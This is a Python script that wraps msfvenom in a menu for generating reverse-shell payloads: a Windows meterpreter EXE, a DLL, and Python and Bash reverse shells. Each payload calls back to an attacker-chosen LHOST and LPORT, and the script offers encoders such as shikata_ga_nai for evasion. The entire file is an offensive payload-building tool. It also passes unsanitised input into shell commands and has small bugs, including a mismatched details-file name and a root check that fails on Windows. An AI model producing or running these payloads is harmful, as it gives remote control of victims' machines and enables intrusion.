import platform
import os
import time


def print_banner():
    banner = r"""
   ____       _     ____        _   
  / ___| __ _| |__ |  _ \  __ _| |_ 
 | |  _ / _` | '_ \| | | |/ _` | __|
 | |_| | (_| | | | | |_| | (_| | |_ 
  \____|\__,_|_| |_|____/ \__,_|\__|
                                     
    """
    print("\033[1;36m" + banner + "\033[0m")


def get_local_ip():
    current_platform = platform.system()
    if current_platform == 'Windows':
        os.system('ipconfig')
    elif current_platform == 'Linux':
        os.system('ifconfig')

def clear_screen():
    current_platform = platform.system()    
    if current_platform == 'Windows':
        os.system('cls')
    elif current_platform == 'Linux':
        os.system('clear')

def get_encoder_options():
    os.system('msfvenom --list encoders')

def create_windows_exe_payload():
    get_local_ip()
    lhost = input("Enter LHOST: ")
    lport = input("Enter LPORT (e.g 4444): ")
    payload_name = input("Enter the name of the payload: ")
    get_encoder_options()
    encoder = input("Enter encoder (e.g., x86/shikata_ga_nai): ")
    iterations = input("Enter the number of encoder iterations (default 0): ")
    try:
        iterations = int(iterations)
    except ValueError:
        iterations = 0
    if iterations > 0:
        encoder += f" -i {iterations}"
    os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -e {encoder} -f exe -o {payload_name}.exe')
    print("\033[1;32mWindows EXE payload created successfully!\033[0m")
    
    # Write details to a text file
    with open(f"{payload_name}_details.txt", "w") as file:
        file.write(f"Payload Name: {payload_name}\n")
        file.write(f"Encoder: {encoder}\n")
        file.write(f"Iterations: {iterations}\n")
        file.write(f"LHOST: {lhost}\n")
        file.write(f"LPORT: {lport}\n")
        file.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
   
    text = f"Waiting for 5 seconds... Look at {payload_name}_detail.txt for a longer view of this payload creation." 
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.04)  # Adjust the sleep duration to control the typing speed
    print()
    time.sleep(5)


def create_python_payload():
    get_local_ip()
    lhost = input("Enter LHOST: ")
    lport = input("Enter LPORT (e.g 4444): ")
    payload_name = input("Enter the name of the payload: ")
    get_encoder_options()
    encoder = input("Enter encoder (e.g., cmd/echo): ")
    iterations = int(input("Enter the number of encoder iterations (default 0): "))
    if iterations > 0:
        encoder += f" -i {iterations}"
    os.system(f'msfvenom -p cmd/unix/reverse_python LHOST={lhost} LPORT={lport} -e {encoder} -f raw -o {payload_name}.py')
    print("\033[1;32mPython payload created successfully!\033[0m")

        # Write details to a text file
    with open(f"{payload_name}_details.txt", "w") as file:
        file.write(f"Payload Name: {payload_name}\n")
        file.write(f"Encoder: {encoder}\n")
        file.write(f"Iterations: {iterations}\n")
        file.write(f"LHOST: {lhost}\n")
        file.write(f"LPORT: {lport}\n")
        file.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

    text = f"Waiting for 5 seconds... Look at {payload_name}_detail.txt for a longer view of this payload creation." 
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.04)  # Adjust the sleep duration to control the typing speed
    print()
    time.sleep(5)



def create_bash_payload():
    get_local_ip()
    lhost = input("Enter LHOST: ")
    lport = input("Enter LPORT (e.g 4444): ")
    payload_name = input("Enter the name of the payload: ")
    get_encoder_options()
    encoder = input("Enter encoder (e.g., cmd/echo): ")
    iterations = int(input("Enter the number of encoder iterations (default 0): "))
    if iterations > 0:
        encoder += f" -i {iterations}"
    os.system(f'msfvenom -p cmd/unix/reverse_bash LHOST={lhost} LPORT={lport} -e {encoder} -f raw -o {payload_name}.sh')
    print("\033[1;32mBash payload created successfully!\033[0m")
    # Write details to a text file
    with open(f"{payload_name}_details.txt", "w") as file:
        file.write(f"Payload Name: {payload_name}\n")
        file.write(f"Encoder: {encoder}\n")
        file.write(f"Iterations: {iterations}\n")
        file.write(f"LHOST: {lhost}\n")
        file.write(f"LPORT: {lport}\n")
        file.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

    text = f"Waiting for 5 seconds... Look at {payload_name}_detail.txt for a longer view of this payload creation." 
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.04)  # Adjust the sleep duration to control the typing speed
    print()
    time.sleep(5)


def create_dll_payload():
    get_local_ip()
    lhost = input("Enter LHOST: ")
    lport = input("Enter LPORT (e.g 4444): ")
    payload_name = input("Enter the name of the payload: ")
    get_encoder_options()
    encoder = input("Enter encoder (e.g., cmd/echo): ")
    iterations = int(input("Enter the number of encoder iterations (default 0): "))
    if iterations > 0:
        encoder += f" -i {iterations}"
    os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -e {encoder} -f dll -o {payload_name}.dll')
    print("\033[1;32mDLL payload created successfully!\033[0m")
    # Write details to a text file
    with open(f"{payload_name}_details.txt", "w") as file:
        file.write(f"Payload Name: {payload_name}\n")
        file.write(f"Encoder: {encoder}\n")
        file.write(f"Iterations: {iterations}\n")
        file.write(f"LHOST: {lhost}\n")
        file.write(f"LPORT: {lport}\n")
        file.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

    text = f"Waiting for 5 seconds... Look at {payload_name}_detail.txt for a longer view of this payload creation." 
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.04)  # Adjust the sleep duration to control the typing speed
    print()
    time.sleep(5)


def print_menu():
    print("\033[1;32m")
    print("1. Create Windows EXE payload")
    print("2. Create Python payload")
    print("3. Create Bash payload")
    print("4. Create DLL payload")
    print("0. Exit")
    print("\033[0m")

def check_sudo():
    if os.geteuid() != 0:
        print("\033[1;31mPlease run the script with sudo privileges.\033[0m")
        exit()

while True:
    check_sudo()
    clear_screen()
    print_banner()
    print_menu()
    choice = input("Enter your choice: ")
    if choice == '1':
        create_windows_exe_payload()
    elif choice == '2':
        create_python_payload()
    elif choice == '3':
        create_bash_payload()
    elif choice == '4':
        create_dll_payload()
    elif choice == '0':
        break
    else:
        print("Invalid choice. Please try again.")
